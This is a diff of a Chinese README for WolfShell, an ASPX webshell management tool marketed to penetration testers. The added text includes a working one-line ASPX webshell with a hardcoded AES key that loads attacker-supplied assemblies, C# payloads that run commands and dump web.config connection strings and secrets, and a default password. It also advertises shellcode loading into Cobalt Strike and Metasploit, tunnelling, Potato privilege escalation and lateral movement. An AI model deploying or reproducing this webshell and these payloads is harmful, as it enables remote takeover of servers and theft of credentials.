@@ -1,7 +1,9 @@
-![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)
-# WolfShell：专为ASPX设计的高级WebShell管理工具
 
-WolfShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。
+![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)
+
+# 金刚狼：专为ASPX设计的高级WebShell管理工具
+
+金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。
 
 ## 🚀 核心优势
 
@@ -14,15 +16,22 @@ WolfShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为
 
 *   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。
 *   PowerShell命令执行： 支持执行 PowerShell 脚本和命令。
-*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode。
+*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。
 *   C#代码执行： 支持在运行时动态加载与执行 C# 代码。
 *   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
+*   HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。
 *   Potato提权： 利用系统服务漏洞进行权限提升，支持两种提权模块：
 *   efspotato： 利用 EFSPotato 实现权限提升。
 *   badpotato： 利用 BadPotato 实现权限提升。
 *   内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网webshell执行 CMD 命令进行横向移动。
 *   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网webshell执行 PowerShell 命令进行横向移动。
 
+## 辅助功能
+
+### 加密解密
+
+*   支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
+*   支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码
 
 ## 安装与使用
 
@@ -34,14 +43,17 @@ WolfShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为
 
 3. **上传WolfShell**
    - 将WolfShell文件上传到目标ASPX服务器。
-   
-```csharp
-<%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(Request.Cookies[0].Value); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
-```
-4. **访问WebShell**
-   - 通过工具客户端连接WebShell，开始使用。
 
-![wolf](http://www.18k.icu/img/wolfshell/WolfShell.png)
+```csharp
+
+<%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
+
+```
+
+4. **访问WebShell**
+   - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。
+
+![keep](http://www.18k.icu/img/wolfshell/WolfShell.png)
 
 
 ## 示例
@@ -77,7 +89,7 @@ return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Valida
 
 ```
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode2.png)
+![C#代码示例](http://www.18k.icu/img/wolfshell/CodeViewKey.png)
 
 #### 扫描C段存活主机 示例代码
 ```csharp
@@ -123,15 +135,117 @@ return iplist.ToString();
 ```
 
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode.png)
+![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCping.png)
+
+
+
+#### CMD命令执行 示例代码
+
+```csharp
+
+using System;
+using System.Diagnostics;
+public class Eval
+{
+public string eval(Object obj)
+{
+try
+{
+Process process = new Process();
+process.StartInfo.FileName = "cmd.exe";
+process.StartInfo.Arguments = "/c whoami";
+process.StartInfo.UseShellExecute = false;
+process.StartInfo.RedirectStandardOutput = true;
+process.Start();
+string result = process.StandardOutput.ReadToEnd();
+process.WaitForExit();
+return result;
+}
+catch (Exception ex)
+{
+return "Error occurred: " + ex.Message;
+}
+}
+}
+
+
+```
+
+![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCmd.png)
+
+
+#### 获取web.config密码 示例代码
+
+```csharp
+
+using System;
+using System.Configuration;
+using System.Text;
+public class Eval
+{
+public string eval(Object obj)
+{
+try
+{
+var connectionStrings = ConfigurationManager.ConnectionStrings;
+var appSettings = ConfigurationManager.AppSettings;
+var result = new StringBuilder();
+foreach (ConnectionStringSettings connectionString in connectionStrings)
+{
+result.AppendLine("Connection string name: " + connectionString.Name);
+result.AppendLine("Connection string value: " + connectionString.ConnectionString);
+result.AppendLine();
+}
+result.AppendLine();
+foreach (string key in appSettings.AllKeys)
+{
+result.AppendLine("Key: " + key + ", Value: " + appSettings[key]);
+}
+return result.ToString();
+}
+catch (Exception ex)
+{
+return "Error occurred: " + ex.Message;
+}
+}
+}
+
+
+```
+
+![C#代码示例](http://www.18k.icu/img/wolfshell/CodeWebConfig.png)
+
+
+###  加密解密算法
+
+支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
+支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码
+
+#### 金刚狼密码
+
+![WolfHash](http://www.18k.icu/img/wolfshell/WolfHash.png)
+
+#### ASCII码加密
+
+![WolfShell](http://www.18k.icu/img/wolfshell/ascii.png)
+
+#### BASE64解密
+
+![WolfShell](http://www.18k.icu/img/wolfshell/unBase64.png)
+
+#### HEX十六进制解密
+
+![WolfShell](http://www.18k.icu/img/wolfshell/unhex.png)
+
+
 
 ### Potato提权示例
 
-#### efspotato
+#### efspotato提权
 
 ![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)
 
-#### badpotato
+#### badpotato提权
 
 
 ![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)
@@ -144,6 +258,10 @@ return iplist.ToString();
 
 ![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)
 
+
+### HTTP代理示例
+
+![端口转发示例](http://www.18k.icu/img/wolfshell/Suo5Tunnel.png)
 
 ## 免责声明
 
